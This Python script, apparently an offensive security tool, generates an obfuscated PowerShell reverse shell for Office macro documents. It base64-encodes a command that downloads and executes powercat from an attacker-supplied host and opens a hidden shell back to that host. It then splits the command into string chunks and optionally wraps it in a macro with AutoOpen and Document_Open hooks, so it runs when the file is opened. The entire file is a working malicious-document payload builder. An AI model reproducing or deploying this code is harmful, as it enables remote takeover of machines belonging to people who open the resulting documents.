# Generate a Base64 encoded powercat reverse shell concatenated into 50 character strings for use in Office Macros

import argparse
import base64

parser = argparse.ArgumentParser(
    prog="Macro Reverse Shell Generator",
    description="Generate a Base64 encoded powercat reverse shell " \
    "concatenated into 50 character strings for use in Office Macros",
)

parser.add_argument("-l", "--lhost", required=True)
parser.add_argument("-p", "--port", default=443, type=int)
parser.add_argument("-O", "--outfile")
parser.add_argument(
    "-M", "--macro", action=argparse.BooleanOptionalAction
)  # Prepare the full Macro rather than just the reverse shell

args = parser.parse_args()

rshell = (f"IEX(New-Object System.Net.WebClient).DownloadString('http://{args.lhost}/powercat.ps1');"
          f"powercat -c {args.lhost} -p {args.port} -e powershell")

preamble = 'powershell.exe -nop -w hidden -enc '
encoded_rshell = base64.b64encode(rshell.encode("utf-16le"))

base64_revshell = preamble + encoded_rshell.decode()

line_length = 50

macro_revshell = ""

for i in range(0, len(base64_revshell), line_length):
    macro_revshell += (
            "Str = Str + " + '"' + base64_revshell[i: i + line_length] + '"' + "\n"
    )

print(macro_revshell)

if args.outfile:
    f = open(args.outfile, "w")
    if args.macro:
        f.write(
            "Sub AutoOpen()\n"
            "MyMacro\n"
            "End Sub\n"
            "\n"
            "Sub Document_Open()\n"
            "MyMacro\n"
            "End Sub\n"
            "\n"
            "Sub MyMacro()\n"
            "Dim Str As String \n"
            "\n"
        )
        f.write(macro_revshell)
        f.write("\n" 'CreateObject("Wscript.Shell").Run Str\n' "End Sub")
    else:
        f.write(macro_revshell)
    print(f"Macro Reverse Shell written to {args.outfile}")
    f.close()
